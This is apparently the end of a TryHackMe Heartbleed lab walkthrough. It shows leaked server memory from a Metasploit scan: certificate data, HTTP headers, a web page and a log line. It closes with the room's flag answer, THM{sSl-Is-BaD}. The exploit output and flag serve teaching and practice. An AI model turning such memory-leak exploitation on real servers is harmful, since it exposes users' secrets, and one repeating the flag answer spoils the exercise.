...............................0...0.............~W..cB0...*.H........0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0...190216104114Z..200216104114Z0k1.0...U....UK1.0...U....London1.0...U....London1.0...U....TryHackMe1.0...U....TryHackMe1.0...U....localhost0.."0...*.H.............0.........OA.=.......v..lJ.b.....Z.@...(.ph.2..?...'7.)...h......f..j....\Y..::.C......K~.r!.7..b~..w........#V..n.z.........$..l..D..o>.RJ..V9....+...z-A...$....=.V%...~......=..P..h..?....T............".T..T.3.....+.c..'..E...!!.%...E.+....o.2u*.5..fuBP.r:..v.sPY......P0N0...U........8X..z.....R.WdZ..-0...U.#..0.....8X..z.....R.WdZ..-0...U....0....0...*.H.................^UI..q.n.......".x..0w.k...\...U.....t.g.4.D<*m.\y...].M..qeH.S.U.N^m.,.|%..L"(I..K.k.....1..&M.P.|6..f...$A.......rZ..Zfg}[4...3.]..I.y._..|..$P.....{...W.Z.....y/......ZD....k.paq.>R..........|)......`............n.G.~.....-..6..+...$9f._".,~,......C....K...G...A....K..+.Y0.....D.M.1oIT.......Os.b>.--.".bX.XD.....Y.{....Q 5..d..5...g.n......I.b.AE'*.'....q-..<..\H...4&.aa.+..j ..;..x.]T[..KOe...QVH.;y.gHW..t.?.k..=U....r.Oo.NN.....3)a......... ...T.,....x9_..d....}.P.....].....1C~...6..0.I...u.4.I..-.Y...'.W8......<.DG.D..."..#......!...X.......U.I..F.g..=/.g...Y..F.'02"..w*-..0?..................................................................................................................................... repeated 2456 times .....................................................................................................................................0........k}{.....k}{...@.w.....@.w.....................................................................................................................................................................................................................................................................................odified:..........k}{.....k}{...................on: keep-alive..ETag: "5c69a630-21e"..Accept-Ranges: bytes........................w...............................x...............................w..............................u......L.I.......w...............................x.......x.......................0...............r...............r.......w..................................................................................................................................... repeated 436 times .....................................................................................................................................*........k}{.....k}{.....w.......w.......................................................................................................................................................................................w...............w.......w.......................w.......x......u........w.....................<!DOCTYPE html>.<html>.<head>.<title>What are you looking for?</title>.<style>.    body {.        width: 35em;.        margin: 0 auto;.        font-family: Tahoma, Verdana, Arial, sans-serif;.    }.</style>.</head>.<body>.<h1> Who said static pages aren't fun right? </h1>.<video width="560" height="315" controls>.  <source src="heartbleed-song.mp4" type="video/mp4">.</video>.<p> My friend really like this Heartbleed song - I think you all will like it too </p>..<!-- don't forget to remove secret communication pages -->..</body>.</html>.....w...............w.......w.....10.66.124.124 - - [31/Aug/2026:21:16:34 +0000] "GET / HTTP/1.1" 200 542 "-" "-"..................................................................................................................................... repeated 2103 times .....................................................................................................................................8.k}{...8.k}{.....x.......x..................................................................................................................................... repeated 2739 times .....................................................................................................................................
[*] TARGET_IP:443      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### What is the flag?

In the above output the embedded flag is **THM{sSl-Is-BaD}**.